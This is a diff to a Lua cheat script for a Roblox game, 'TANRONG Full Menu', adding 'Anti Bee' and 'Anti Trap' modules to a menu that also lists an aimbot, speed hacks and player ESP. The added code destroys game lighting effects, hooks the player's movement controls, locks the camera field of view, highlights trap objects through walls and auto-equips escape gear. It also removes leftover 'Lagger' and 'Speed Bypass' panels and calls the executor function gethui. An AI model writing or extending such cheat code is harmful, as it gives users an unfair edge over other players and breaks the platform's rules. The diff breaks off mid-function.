@@ -1,6 +1,6 @@
 --[[
 TANRONG — Full Menu
-Tab 1 Player: Anti Gummy/Ragdoll/Paintball/Boogie + Speed 3-mode (tanrong S2 loop)
+Tab 1 Player: Anti Gummy/Bee/Ragdoll/Paintball/Boogie/Trap + Auto Destroy V2 + Speed 3-mode (tanrong S2 loop)
 + Tool Aimbot + Drop Jump/Stand + Insta V1/V2 + TP Down keybinds
 Tab 2 ESP: Player ESP + Tracker + Anti Lag (tanrong logic)
 Tab 3 Settings: Mobile 3-mode buttons, Lock/Unlock, shape Box/Round/Square,
@@ -26,11 +26,34 @@ local PlayerGui = LP:WaitForChild("PlayerGui", 30) or LP:FindFirstChild("PlayerG
 
 pcall(function()
 	for _, n in ipairs({
-"TANRONGHubFullMenu", "TANRONGHubFullMini", "TANRONGHubModeBar", "TANRONGHubActionButtons", "TANRONGIntro", "LIGHTHUBIntro", "TANRONGHubIntro",
+"TANRONGHubFullMenu", "TANRONGHubFullMini", "TANRONGHubModeBar", "TANRONGHubActionButtons", "TANRONGIntro", "LIGHTHUBIntro", "TANRONGHubIntro", "TANRONGBypassGui", "Per1shccLaggerV2",
 	}) do
 local g = PlayerGui:FindFirstChild(n)
 if g then g:Destroy() end
 	end
+end)
+
+-- Remove detached Lagger / Speed Bypass panels left behind by older versions.
+pcall(function()
+    local names = {"TANRONGBypassGui", "Per1shccLaggerV2"}
+    local parents = {PlayerGui, game:GetService("CoreGui")}
+    pcall(function()
+        if type(gethui) == "function" then
+            local hiddenGui = gethui()
+            if hiddenGui then table.insert(parents, hiddenGui) end
+        end
+    end)
+    for _, parent in ipairs(parents) do
+        if parent then
+            for _, name in ipairs(names) do
+                local old = parent:FindFirstChild(name)
+                if old then pcall(function() old:Destroy() end) end
+            end
+        end
+    end
+    for _, key in ipairs({"TANRONGSetLaggerPanel", "TANRONGSetSpeedBypassPanel", "AceSetPerishV2PanelVisible", "AceTogglePerishV2Panel", "AceSetTanrongBypassPanelVisible"}) do
+        _G[key] = nil
+    end
 end)
 
 
@@ -2512,7 +2535,9 @@ end)
 end)
 
 local St = {
-	antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true,
+	antiGummy = true, antiBee = false, antiRagdoll = false, antiPaint = true, antiBoogie = true,
+	antiTrap = false, antiTrapGear = "Cupid's Wings", antiTrapZeroM = false,
+	trapESP = false, trapDistanceESP = true, trapOutlineESP = true, subspaceESP = true, trapScanRange = 250,
 	toolAim = true, speedOn = true, infJump = true, bodyLock = false, bodyLockRange = 20,
 	activeMode = "Normal",
 	modes = {
@@ -2523,11 +2548,11 @@ Custom = { norm = 33, steal = 33, key = Enum.KeyCode.C },
 	dropMode = 2, -- 1 Stand/Fling, 2 Jump
 	instaMode = "V1",
 	mobileBtns = true, guiLock = false, -- default ON: Drop / Insta / TP buttons
-	showStealBtn = true, showLaggerPanel = false, showPingLaggerPanel = false, showSpeedBypassPanel = false, speedBypassLock = false, panelGuiScale = 0.7, panelGuiWidth = 1, laggerPanelLock = false, pingPanelLock = false, -- hiện nút Auto Steal ngoài (độc lập auto steal on/off)
+	showStealBtn = true, -- hiện nút Auto Steal ngoài (độc lập auto steal on/off)
 	btnShape = "Square", -- Round | Box | Square
 	btnScale = 0.75,
 	menuScale = 1.0,
-	btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50 },
+	btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50, antiTrap = 50 },
 	keys = {
 Drop = Enum.KeyCode.X,
 TPDown = Enum.KeyCode.F,
@@ -2675,6 +2700,21 @@ end
 	return true
 end
 loadCfg()
+-- Normalize Anti Trap settings loaded from older configs.
+St.antiTrap = St.antiTrap == true
+St.antiTrapGear = tostring(St.antiTrapGear or "Cupid's Wings")
+St.antiTrapZeroM = St.antiTrap == true
+St.trapESP = St.trapESP == true
+St.trapDistanceESP = St.trapDistanceESP ~= false
+St.trapOutlineESP = St.trapOutlineESP ~= false
+St.subspaceESP = St.subspaceESP ~= false
+St.trapScanRange = math.clamp(tonumber(St.trapScanRange) or 250, 10, 1000)
+St.btnSizes = St.btnSizes or {}
+St.btnSizes.antiTrap = math.clamp(tonumber(St.btnSizes.antiTrap) or 50, 20, 200)
+-- Strip obsolete panel flags from older saved configs.
+for _, obsoleteKey in ipairs({"showLaggerPanel", "showPingLaggerPanel", "showSpeedBypassPanel", "speedBypassLock", "panelGuiScale", "panelGuiWidth", "laggerPanelLock", "pingPanelLock"}) do
+    St[obsoleteKey] = nil
+end
 task.spawn(function()
 	while true do
 task.wait(3)
@@ -3343,6 +3383,1142 @@ function setAntiPaint(on)
 	saveCfg()
 end
 
+-- ============================================================================
+-- ANTI BEE — MERGED FULL ENGINE
+-- Sources integrated:
+--   1) La Peak's existing Anti Bee block
+--   2) antibee.lua.txt: broad visual blacklist + FOV 70 + touch/gamepad move loop
+--   3) message (7).txt: exact Bee/Lighting names + BeeLauncherController sound
+--
+-- Design:
+--   - One toggle controls the complete system.
+--   - Event-driven first, with targeted sweeps so it does not scan Lighting every
+--     Heartbeat.
+--   - Covers both class-based post-effects and game-specific named Bee effects.
+--   - Re-checks after respawn and catches recreated Bee/Buzzing instances.
+--   - Restores FOV/sound state when disabled instead of leaving permanent changes.
+-- ============================================================================
+do
+    local RunService = RS
+    local AntiBeeFull = {
+        enabled = false,
+        conns = {},
+        originalMoveFunction = nil,
+        controlsProtected = false,
+        originalFOV = nil,
+        savedSoundVolumes = {},
+        hookedSounds = {},
+        movementLockUntil = 0,
+        movementLockDuration = 0.45,
+    }
+
+    -- Class/type blacklist from the standalone Anti Bee source.
+    local effectClasses = {
+        "BlurEffect", "ColorCorrectionEffect", "BloomEffect", "SunRaysEffect",
+        "DepthOfFieldEffect", "Atmosphere", "Sky", "Smoke", "ParticleEmitter",
+        "Beam", "Trail", "Highlight", "PostEffect", "SurfaceAppearance", "Fire",
+        "Sparkles", "Explosion", "PointLight", "SpotLight", "SurfaceLight",
+        "Shadows", "Blur", "Fog", "ColorGradingEffect", "ToneMappingEffect",
+        "VignetteEffect", "GodRays", "Glare", "ChromaticAberrationEffect",
+        "DistortionEffect", "LensFlare", "SunFlare", "LightInfluence",
+        "AmbientOcclusionEffect", "RefractionEffect", "HeatDistortion",
+        "GlitchEffect", "ScreenSpaceReflection", "MotionBlur", "VolumetricLight",
+        "RainEffect", "SnowEffect", "LightningEffect", "NeonGlow", "ContrastCorrection",
+        "ShadowMap", "Bloom", "Clouds", "FogVolume", "WaterEffect", "WindEffect",
+        "PixelateEffect", "FilmGrainEffect", "CRTShader", "NightVisionEffect",
+        "InfraredEffect", "HazeEffect", "ColorBalanceEffect", "DynamicLight",
+        "AmbientEffect", "ScreenDistortion", "ScanlineEffect", "UnderwaterEffect",
+        "ThermalVision", "ShockwaveEffect", "FlashEffect", "ExplosionLight",
+        "VFXPart", "GlitchScreen", "ScreenFlash", "OverlayEffect", "ShadowEffect",
+        "GhostEffect", "FogEmitter", "WindEmitter", "HeatWave", "SunGlow",
+        "ColorOverlay", "VisionDistort", "EchoEffect", "ScreenOverlay", "VisualEffect",
+        "LightingEffect", "CameraEffect", "WeatherEffect", "SmokeTrail", "FireTrail",
+        "NeonEffect", "RefractionLayer", "PostProcessingEffect", "VisualNoise",
+        "ScreenNoise",
+    }
+
+    -- Game-specific names found across the supplied Anti Bee implementations.
+    local effectNames = {
+        BeeBlur = true,
+        Flashbang = true,
+        Blue = true,
+        DiscoEffect = true,
+        ColorCorrection = true,
+    }
+
+    local SOUND_NAMES = {
+        Buzzing = true,
+    }
+
+    local function isBlacklisted(obj)
+        if not obj then return false end
+
+        local n = obj.Name
+        if effectNames[n] then
+            return true
+        end
+
+        for _, className in ipairs(effectClasses) do
+            local ok, result = pcall(function()
+                return obj:IsA(className)
+            end)
+            if ok and result then
+                return true
+            end
+        end
+
+        return false
+    end
+
+    local function lockMovementForBee()
+        if not AntiBeeFull.enabled then return end
+        AntiBeeFull.movementLockUntil = math.max(
+            AntiBeeFull.movementLockUntil or 0,
+            os.clock() + (AntiBeeFull.movementLockDuration or 0.45)
+        )
+    end
+
+    local function beeMovementLocked()
+        return AntiBeeFull.enabled and os.clock() < (AntiBeeFull.movementLockUntil or 0)
+    end
+
+    local function rememberAndSilenceSound(sound)
+        if not sound or not sound:IsA("Sound") then return end
+        -- Buzzing is one of the exact Bee-hit signals from the supplied Anti Bee sources.
+        lockMovementForBee()
+        if not AntiBeeFull.savedSoundVolumes[sound] then
+            AntiBeeFull.savedSoundVolumes[sound] = sound.Volume
+        end
+        pcall(function()
+            sound:Stop()
+            sound.Volume = 0
+        end)
+    end
+
+    local function hookBuzzingSound(sound)
+        if not sound or not sound:IsA("Sound") then return end
+        rememberAndSilenceSound(sound)
+
+        if AntiBeeFull.hookedSounds[sound] then
+            return
+        end
+        AntiBeeFull.hookedSounds[sound] = true
+
+        table.insert(AntiBeeFull.conns, sound.Played:Connect(function()
+            if AntiBeeFull.enabled and sound.Parent then
+                task.defer(function()
+                    if AntiBeeFull.enabled and sound.Parent then
+                        rememberAndSilenceSound(sound)
+                    end
+                end)
+            end
+        end))
+    end
+
+    local function restoreSoundVolumes()
+        for sound, volume in pairs(AntiBeeFull.savedSoundVolumes) do
+            if sound and sound.Parent then
+                pcall(function()
+                    sound.Volume = volume
+                end)
+            end
+        end
+        AntiBeeFull.savedSoundVolumes = {}
+        AntiBeeFull.hookedSounds = {}
+    end
+
+    local function scanLighting()
+        local root = Lighting
+        if not root then return end
+
+        for _, obj in ipairs(root:GetDescendants()) do
+            if isBlacklisted(obj) then
+                -- These are the Bee/Disco visual-hit signals supplied by the
+                -- reference Anti Bee implementations. Lock movement before removal.
+                if effectNames[obj.Name] then
+                    lockMovementForBee()
+                end
+                pcall(function()
+                    obj:Destroy()
+                end)
+            end
+        end
+    end
+
+    local function scanForBeeSounds()
+        -- Supplied source #3: ReplicatedStorage.Controllers.BeeLauncherController.Buzzing
+        pcall(function()
+            local controllers = ReplicatedStorage:FindFirstChild("Controllers")
+            local beeController = controllers and controllers:FindFirstChild("BeeLauncherController")
+            local buzzing = beeController and beeController:FindFirstChild("Buzzing", true)
+            if buzzing and buzzing:IsA("Sound") then
+                hookBuzzingSound(buzzing)
+            end
+        end)
+
+        -- Supplied source #2/#3: PlayerScripts/Bee/.../Buzzing
+        pcall(function()
+            local playerScripts = LP:FindFirstChild("PlayerScripts")
+            if not playerScripts then return end
+
+            local beeRoot = playerScripts:FindFirstChild("Bee", true)
+            if beeRoot then
+                local buzzing = beeRoot:FindFirstChild("Buzzing", true)
+                if buzzing and buzzing:IsA("Sound") then
+                    hookBuzzingSound(buzzing)
+                end
+            end
+
+            -- Extra catch-all for recreated/renamed Bee sound instances that still
+            -- use the supplied "Buzzing" sound name.
+            for _, obj in ipairs(playerScripts:GetDescendants()) do
+                if obj:IsA("Sound") and SOUND_NAMES[obj.Name] then
+                    hookBuzzingSound(obj)
+                end
+            end
+        end)
+    end
+
+    local function disconnectAll()
+        for _, conn in ipairs(AntiBeeFull.conns) do
+            pcall(function()
+                conn:Disconnect()
+            end)
+        end
+        AntiBeeFull.conns = {}
+        AntiBeeFull.controlsProtected = false
+    end
+
+    local function protectControls()
+        if AntiBeeFull.controlsProtected then return end
+
+        pcall(function()
+            local playerScripts = LP:FindFirstChild("PlayerScripts")
+            local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")
+            if not playerModule then return end
+
+            local controlsModule = require(playerModule)
+            local controls = controlsModule and controlsModule.GetControls and controlsModule:GetControls()
+            if not controls then return end
+
+            if not AntiBeeFull.originalMoveFunction then
+                AntiBeeFull.originalMoveFunction = controls.moveFunction
+            end
+
+            local protectedMove = function(self, moveVector, relativeToCamera)
+                if AntiBeeFull.originalMoveFunction then
+                    -- While a Bee-hit signal is active, discard the player's movement
+                    -- vector briefly so the Bee cannot reverse/flip the character.
+                    if beeMovementLocked() then
+                        return AntiBeeFull.originalMoveFunction(self, Vector3.zero, relativeToCamera)
+                    end
+                    return AntiBeeFull.originalMoveFunction(self, moveVector, relativeToCamera)
+                end
+            end
+
+            controls.moveFunction = protectedMove
+            AntiBeeFull.controlsProtected = true
+
+            local acc = 0
+            table.insert(AntiBeeFull.conns, RunService.Heartbeat:Connect(function(dt)
+                if not AntiBeeFull.enabled then return end
+                acc += dt
+                if acc < 0.50 then return end
+                acc = 0
+
+                pcall(function()
+                    if controls.moveFunction ~= protectedMove then
+                        controls.moveFunction = protectedMove
+                    end
+                end)
+            end))
+        end)
+    end
+
+    local function restoreControls()
+        if not AntiBeeFull.originalMoveFunction then
+            AntiBeeFull.controlsProtected = false
+            return
+        end
+
+        pcall(function()
+            local playerScripts = LP:FindFirstChild("PlayerScripts")
+            local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")
+            if not playerModule then return end
+
+            local controlsModule = require(playerModule)
+            local controls = controlsModule and controlsModule.GetControls and controlsModule:GetControls()
+            if controls then
+                controls.moveFunction = AntiBeeFull.originalMoveFunction
+            end
+        end)
+
+        AntiBeeFull.originalMoveFunction = nil
+        AntiBeeFull.controlsProtected = false
+    end
+
+    local function applyFOVLock()
+        local cam = workspace.CurrentCamera
+        if not cam then return end
+
+        if AntiBeeFull.originalFOV == nil then
+            AntiBeeFull.originalFOV = cam.FieldOfView
+        end
+
+        cam.FieldOfView = 70
+    end
+
+    local function restoreFOV()
+        local cam = workspace.CurrentCamera
+        if cam and AntiBeeFull.originalFOV ~= nil then
+            pcall(function()
+                cam.FieldOfView = AntiBeeFull.originalFOV
+            end)
+        end
+        AntiBeeFull.originalFOV = nil
+    end
+
+    local function handleLightingAdded(obj)
+        if not AntiBeeFull.enabled or not obj then return end
+        if not obj:IsDescendantOf(Lighting) then return end
+
+        task.defer(function()
+            if not AntiBeeFull.enabled or not obj.Parent then return end
+            if not obj:IsDescendantOf(Lighting) then return end
+            if isBlacklisted(obj) then
+                if effectNames[obj.Name] then
+                    lockMovementForBee()
+                end
+                pcall(function()
+                    obj:Destroy()
+                end)
+            end
+        end)
+    end
+
+    local function handleDescendantAdded(obj)
+        if not AntiBeeFull.enabled or not obj then return end
+
+        -- Lighting effect protection.
+        handleLightingAdded(obj)
+
+        -- Sound protection for recreated Bee/Buzzing objects.
+        if obj:IsA("Sound") and SOUND_NAMES[obj.Name] then
+            task.defer(function()
+                if AntiBeeFull.enabled and obj.Parent then
+                    hookBuzzingSound(obj)
+                end
+            end)
+        end
+    end
+
+    local function startAntiBee()
+        if AntiBeeFull.enabled then return end
+
+        disconnectAll()
+        AntiBeeFull.enabled = true
+
+        -- Immediate cleanup on enable.
+        scanLighting()
+        scanForBeeSounds()
+        protectControls()
+        applyFOVLock()
+
+        -- Fast event-driven Lighting protection.
+        table.insert(AntiBeeFull.conns, Lighting.DescendantAdded:Connect(handleLightingAdded))
+
+        -- Catch recreated Bee/Buzzing nodes under PlayerScripts.
+        pcall(function()
+            local playerScripts = LP:FindFirstChild("PlayerScripts")
+            if playerScripts then
+                table.insert(AntiBeeFull.conns, playerScripts.DescendantAdded:Connect(function(obj)
+                    if not AntiBeeFull.enabled then return end
+                    handleDescendantAdded(obj)
+                end))
+            end
+        end)
+
+        -- Catch Bee controller descendants when the controller is recreated.
+        pcall(function()
+            table.insert(AntiBeeFull.conns, ReplicatedStorage.DescendantAdded:Connect(function(obj)
+                if not AntiBeeFull.enabled or not obj then return end
+                if obj.Name == "Buzzing" and obj:IsA("Sound") then
+                    local beeController = obj:FindFirstAncestor("BeeLauncherController")
+                    if beeController then
+                        task.defer(function()
+                            if AntiBeeFull.enabled and obj.Parent then
+                                hookBuzzingSound(obj)
+                            end
+                        end)
+                    end
+                end
+            end))
+        end)
+
+        -- The hook above listens to Sound.Played, matching the supplied
+        -- controller-level anti-Bee behavior while also surviving recreated sounds.
+
+        -- FPS-safe movement protection. Do not call Humanoid:Move every frame.
+        -- PlayerModule.moveFunction is already protected above; only force zero
+        -- movement during the short Bee lock, at a low frequency.
+        local beeTick = 0
+        table.insert(AntiBeeFull.conns, RunService.Heartbeat:Connect(function(dt)
+            if not AntiBeeFull.enabled then return end
+            beeTick += dt
+            if beeTick < 0.10 then return end
+            beeTick = 0
+
+            if beeMovementLocked() then
+                local char = LP.Character
+                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    pcall(function() humanoid:Move(Vector3.zero, true) end)
+                end
+            end
+
+            local cam = workspace.CurrentCamera
+            if cam and math.abs(cam.FieldOfView - 70) > 0.05 then
+                cam.FieldOfView = 70
+            end
+        end))
+
+        -- Respawn recovery.
+        table.insert(AntiBeeFull.conns, LP.CharacterAdded:Connect(function()
+            task.defer(function()
+                if not AntiBeeFull.enabled then return end
+                scanLighting()
+                scanForBeeSounds()
+                protectControls()
+                applyFOVLock()
+            end)
+        end))
+
+        _G.RanaVS_AntiBeeFullActive = true
+    end
+
+    local function stopAntiBee()
+        AntiBeeFull.enabled = false
+        AntiBeeFull.movementLockUntil = 0
+        disconnectAll()
+        restoreControls()
+        restoreSoundVolumes()
+        restoreFOV()
+        _G.RanaVS_AntiBeeFullActive = false
+    end
+
+    function setAntiBee(on)
+        local enable = on == true
+        St.antiBee = enable
+
+        if enable then
+            startAntiBee()
+        else
+            stopAntiBee()
+        end
+
+        pcall(saveCfg)
+        if _G.RanaVSRefreshAntiBeeBtn then
+            pcall(_G.RanaVSRefreshAntiBeeBtn)
+        end
+    end
+
+    _G.RanaVSSetAntiBee = setAntiBee
+    _G.RanaVSStartAntiBee = startAntiBee
+    _G.RanaVSStopAntiBee = stopAntiBee
+end
+
+-- ============================================================================
+-- ============================================================================
+-- ANTI TRAP — merged detector/equip logic
+	local RunService = RS
+	-- Imported from Anti trampa.lua; its standalone UI is intentionally not copied.
+-- Standalone AntiTrap GUI removed: Lord Duels owns the UI.
+-- Adds zero-meter trap detection, fuzzy 5-gear tool matching, and trap ESP.
+-- ============================================================================
+do
+	local AntiTrapState = {
+		enabled = false,
+		gear = "Cupid's Wings",
+		stuckTime = 0,
+		lastPosition = nil,
+		lastEquip = 0,
+		lastTrapEquip = 0,
+		lastZeroMScan = 0,
+		conn = nil,
+	}
+
+	local ANTI_TRAP_CHECK_TIME = 0.025
+	local ANTI_TRAP_MOVEMENT_THRESHOLD = 0.015
+	local ANTI_TRAP_COOLDOWN = 0.15
+	-- "0M" is treated as touching/overlapping range with a small physics epsilon.
+	local ANTI_TRAP_ZERO_M_EPSILON = 1.25
+
+	local ANTI_TRAP_GEARS = {
+		"Cupid's Wings",
+		"Santa's Sleigh",
+		"Witch's Broom",
+		"Flying Carpet",
+		"Waverider",
+	}
+
+	local TRAP_NAME_WORDS = {
+		"trap",
+		"tripmine",
+		"trip mine",
+		"landmine",
+		"land mine",
+		"beartrap",
+		"bear trap",
+		"snare",
+		"subspace",
+	}
+
+	local TOOL_ALIASES = {
+		["Cupid's Wings"] = {"cupid's wings", "cupids wings", "cupid wings", "cupid"},
+		["Santa's Sleigh"] = {"santa's sleigh", "santas sleigh", "santa sleigh", "sleigh", "santa"},
+		["Witch's Broom"] = {"witch's broom", "witchs broom", "witch broom", "broom", "witch"},
+		["Flying Carpet"] = {"flying carpet", "carpet"},
+		["Waverider"] = {"waverider", "wave rider", "waverider", "rider", "wave"},
+	}
+
+	for _, gearName in ipairs(ANTI_TRAP_GEARS) do
+		if St.antiTrapGear == gearName then
+			AntiTrapState.gear = gearName
+			break
+		end
+	end
+	St.antiTrapGear = AntiTrapState.gear
+
+	local function normalizeToolName(name)
+		name = tostring(name or ""):lower()
+		name = name:gsub("[%[%]%(%){}]", " ")
+		name = name:gsub("[^%w%s]", " ")
+		name = name:gsub("%s+", " ")
+		return name:gsub("^%s+", ""):gsub("%s+$", "")
+	end
+
+	local function compactName(name)
+		return normalizeToolName(name):gsub("%s+", "")
+	end
+
+	local function scoreToolName(targetName, candidateName)
+		local target = compactName(targetName)
+		local candidate = compactName(candidateName)
+		if target == "" or candidate == "" then return 0 end
+		if target == candidate then return 1000 end
+
+		local best = 0
+		local aliases = TOOL_ALIASES[targetName] or {}
+		for _, alias in ipairs(aliases) do
+			local a = compactName(alias)
+			if a ~= "" then
+				if candidate == a then
+					best = math.max(best, 950)
+				elseif candidate:find(a, 1, true) or a:find(candidate, 1, true) then
+					best = math.max(best, 850)
+				end
+			end
+		end
+
+		if candidate:find(target, 1, true) then
+			best = math.max(best, 900)
+		elseif target:find(candidate, 1, true) and #candidate >= 4 then
+			best = math.max(best, 780)
+		end
+
+		local targetTokens = {}
+		for tok in normalizeToolName(targetName):gmatch("%S+") do
+			targetTokens[tok] = true
+		end
+		local candidateTokens = {}
+		for tok in normalizeToolName(candidateName):gmatch("%S+") do
+			candidateTokens[tok] = true
+		end
+
+		local overlap, total = 0, 0
+		for tok in pairs(targetTokens) do
+			total += 1
+			if candidateTokens[tok] then overlap += 1 end
+		end
+		if total > 0 and overlap > 0 then
+			best = math.max(best, 600 + math.floor(300 * overlap / total))
+		end
+		return best
+	end
+
+	local function getAllPlayerTools()
+		local out, seen = {}, {}
+		local function scan(container)
+			if not container then return end
+			for _, obj in ipairs(container:GetDescendants()) do
+				if obj:IsA("Tool") and not seen[obj] then
+					seen[obj] = true
+					table.insert(out, obj)
+				end
+			end
+			for _, obj in ipairs(container:GetChildren()) do
+				if obj:IsA("Tool") and not seen[obj] then
+					seen[obj] = true
+					table.insert(out, obj)
+				end
+			end
+		end
+		scan(LP:FindFirstChildOfClass("Backpack"))
+		scan(LP.Character)
+		return out
+	end
+
+	local function antiTrapFindTool(name)
+		if type(name) ~= "string" or name == "" then return nil end
+		local bestTool, bestScore = nil, -1
+		for _, tool in ipairs(getAllPlayerTools()) do
+			local score = scoreToolName(name, tool.Name)
+			if score > bestScore then
+				bestScore = score
+				bestTool = tool
+			end
+		end
+		-- Require a real name match; prevents equipping an unrelated tool.
+		if bestScore >= 600 then
+			return bestTool
+		end
+		return nil
+	end
+
+	-- Inventory-first resolver: prefer the selected gear if it is actually owned,
+	-- otherwise select the first owned alternative from the supported gear list.
+	-- This scans Backpack + Character only (never Workspace) and is called on
+	-- enable/trigger rather than every Heartbeat, to keep it lightweight.
+	local function resolveAvailableAntiTrapTool(preferredName)
+		local tools = getAllPlayerTools()
+		local function matchInInventory(name)
+			if type(name) ~= "string" or name == "" then return nil end
+			local bestTool, bestScore = nil, -1
+			for _, tool in ipairs(tools) do
+				if tool and tool.Parent and tool:IsA("Tool") then
+					local score = scoreToolName(name, tool.Name)
+					if score > bestScore then
+						bestTool, bestScore = tool, score
+					end
+				end
+			end
+			if bestScore >= 600 then return bestTool end
+			return nil
+		end
+
+		local chosenName = preferredName or AntiTrapState.gear
+		local chosenTool = matchInInventory(chosenName)
+		if chosenTool then return chosenTool, chosenName end
+
+		for _, gearName in ipairs(ANTI_TRAP_GEARS) do
+			if gearName ~= chosenName then
+				local tool = matchInInventory(gearName)
+				if tool then
+					AntiTrapState.gear = gearName
+					St.antiTrapGear = gearName
+					pcall(saveCfg)
+					task.defer(function()
+						if _G.RanaVSRefreshAntiTrapGearUI then pcall(_G.RanaVSRefreshAntiTrapGearUI) end
+					end)
+					return tool, gearName
+				end
+			end
+		end
+		return nil, nil
+	end
+
+	-- ------------------------------------------------------------
+	-- TRAP CANDIDATE / POSITION HELPERS
+	-- ------------------------------------------------------------
+	local TrapESP = {
+		data = {},
+		candidates = {},
+		lastScan = 0,
+		visualAccum = 0,
+		heartbeat = nil,
+		visualConn = nil,
+		_conns = {},
+	}
+
+	local function containsTrapWord(name)
+		local s = tostring(name or ""):lower()
+		for _, word in ipairs(TRAP_NAME_WORDS) do
+			if s:find(word, 1, true) then
+				return true
+			end
+		end
+		return false
+	end
+
+	local function isLocalCharacterObject(obj)
+		local char = LP.Character
+		return char and obj and obj:IsDescendantOf(char)
+	end
+
+	local function trapRootFromObject(obj)
+		if not obj then return nil end
+		if isLocalCharacterObject(obj) then return nil end
+
+		local current = obj
+		local best = nil
+		for _ = 1, 8 do
+			if not current or current == workspace then break end
+			if containsTrapWord(current.Name) then
+				if current:IsA("Model") or current:IsA("BasePart") then
+					best = current
+				end
+			end
+			current = current.Parent
+		end
+		if best then return best end
+		if containsTrapWord(obj.Name) and (obj:IsA("Model") or obj:IsA("BasePart")) then
+			return obj
+		end
+		return nil
+	end
+
+	local function trapPosition(obj)
+		if not obj or not obj.Parent then return nil end
+		if obj:IsA("BasePart") then return obj.Position end
+		if obj:IsA("Model") then
+			local ok, cf = pcall(function() return obj:GetPivot() end)
+			if ok and cf then return cf.Position end
+			local p = obj:FindFirstChildWhichIsA("BasePart", true)
+			return p and p.Position or nil
+		end
+		if obj:IsA("Attachment") then return obj.WorldPosition end
+		local p = obj:FindFirstChildWhichIsA("BasePart", true)
+		return p and p.Position or nil
+	end
+
+	local function collectTrapCandidates()
+		local map = {}
+		for _, obj in ipairs(workspace:GetDescendants()) do
+			if (obj:IsA("Model") or obj:IsA("BasePart")) and not isLocalCharacterObject(obj) then
+				local root = trapRootFromObject(obj)
+				if root then
+					map[root] = true
+				end
+			end
+		end
+		TrapESP.candidates = map
+		TrapESP.lastScan = os.clock()
+		return map
+	end
+
+	local function getTrapCandidates()
+		-- Full workspace scan is only used to seed the cache once; subsequent
+		-- additions/removals update TrapESP.candidates incrementally.
+		if TrapESP.lastScan <= 0 then
+			return collectTrapCandidates()
+		end
+		return TrapESP.candidates
+	end
+
+	local function nearestTrap()
+		local char = LP.Character
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+		if not hrp then return nil, math.huge end
+
+		local best, bestDistance = nil, math.huge
+		local maxRange = tonumber(St.trapScanRange) or 250
+		for trap in pairs(getTrapCandidates()) do
+			local pos = trapPosition(trap)
+			if pos then
+				local d = (hrp.Position - pos).Magnitude
+				if d < bestDistance and d <= maxRange then
+					best, bestDistance = trap, d
+				end
+			end
+		end
+		return best, bestDistance
+	end
+
+	local function isSubspaceTrap(trap)
+		return trap and containsTrapWord(trap.Name) and tostring(trap.Name):lower():find("subspace", 1, true) ~= nil
+	end
+
+	-- ------------------------------------------------------------
+	-- TRAP ESP
+	-- ------------------------------------------------------------
+	local function getTrapAdorneePart(trap)
+		if not trap then return nil end
+		if trap:IsA("BasePart") then return trap end
+		return trap:FindFirstChildWhichIsA("BasePart", true)
+	end
+
+	local function trapEspCleanup(trap)
+		local d = TrapESP.data[trap]
+		if not d then return end
+		pcall(function() if d.hl then d.hl:Destroy() end end)
+		pcall(function() if d.bb then d.bb:Destroy() end end)
+		TrapESP.data[trap] = nil
+	end
+
+	local function trapEspSetup(trap)
+		if not St.trapESP then return end
+		if isSubspaceTrap(trap) and not St.subspaceESP then return end
+		local adorneePart = getTrapAdorneePart(trap)
+		if not trap or not adorneePart then return end
+		trapEspCleanup(trap)
+
+		local hl = Instance.new("Highlight")
+		hl.Name = "LordDuels_TrapOutline"
+		hl.Adornee = trap
+		hl.FillColor = isSubspaceTrap(trap) and Color3.fromRGB(240, 191, 66) or Color3.fromRGB(255, 70, 70)
+		hl.FillTransparency = 0.86
+		hl.OutlineColor = isSubspaceTrap(trap) and Color3.fromRGB(240, 191, 66) or Color3.fromRGB(255, 80, 80)
+		hl.OutlineTransparency = St.trapOutlineESP and 0 or 1
+		hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+		hl.Parent = trap
+
+		local bb
+		if St.trapDistanceESP or St.subspaceESP then
+			bb = Instance.new("BillboardGui")
+			bb.Name = "LuaVeilR_TrapDistance"
+			bb.Adornee = adorneePart
+			bb.Size = UDim2.fromOffset(120, 28)
+			bb.StudsOffset = Vector3.new(0, 2.2, 0)
+			bb.AlwaysOnTop = true
+			bb.MaxDistance = math.max(tonumber(St.trapScanRange) or 250, 100)
+			bb.Parent = trap
+
+			local label = Instance.new("TextLabel")
+			label.Name = "Distance"
+			label.Size = UDim2.fromScale(1, 1)
+			label.BackgroundTransparency = 1
+			label.TextColor3 = Color3.new(1, 1, 1)
+			label.TextStrokeTransparency = 0.35
+			label.Font = Enum.Font.GothamBlack
+			label.TextSize = 11
+			label.Parent = bb
+		end
+
+		TrapESP.data[trap] = {hl = hl, bb = bb, part = adorneePart}
+	end
+
+	local function refreshTrapVisuals()
+		for trap in pairs(TrapESP.data) do
+			if not trap or not trap.Parent then
+				trapEspCleanup(trap)
+			end
+		end
+		if not St.trapESP then
+			for trap in pairs(TrapESP.data) do trapEspCleanup(trap) end
+			return
+		end
+		for trap in pairs(getTrapCandidates()) do
+			if not TrapESP.data[trap] then
+				trapEspSetup(trap)
+			end
+		end
+	end
+
+	local function setTrapESP(on)
+		St.trapESP = on == true
+		if St.trapESP then
+			collectTrapCandidates()
+			refreshTrapVisuals()
+		else
+			for trap in pairs(TrapESP.data) do trapEspCleanup(trap) end
+		end
+		pcall(saveCfg)
+	end
+
+	local function setTrapDistanceESP(on)
+		St.trapDistanceESP = on == true
+		if St.trapESP then
+			for trap in pairs(TrapESP.data) do trapEspCleanup(trap) end
+			refreshTrapVisuals()
+		end
+		pcall(saveCfg)
+	end
+
+	local function setTrapOutlineESP(on)
+		St.trapOutlineESP = on == true
+		for trap,d in pairs(TrapESP.data) do
+			if d.hl then d.hl.OutlineTransparency = St.trapOutlineESP and 0 or 1 end
+		end
+		pcall(saveCfg)
+	end
+
+	local function setSubspaceESP(on)
+		St.subspaceESP = on == true
+		if St.trapESP then
+			for trap in pairs(TrapESP.data) do trapEspCleanup(trap) end
+			refreshTrapVisuals()
+		end
+		pcall(saveCfg)
+	end
+
+	local function setTrapScanRange(n)
+		St.trapScanRange = math.clamp(tonumber(n) or 250, 10, 1000)
+		pcall(saveCfg)
+	end
+
+	local function setAntiTrapZeroM(on)
+		-- Alias the ESP control to the same master switch as the Anti Trap toggle/button.
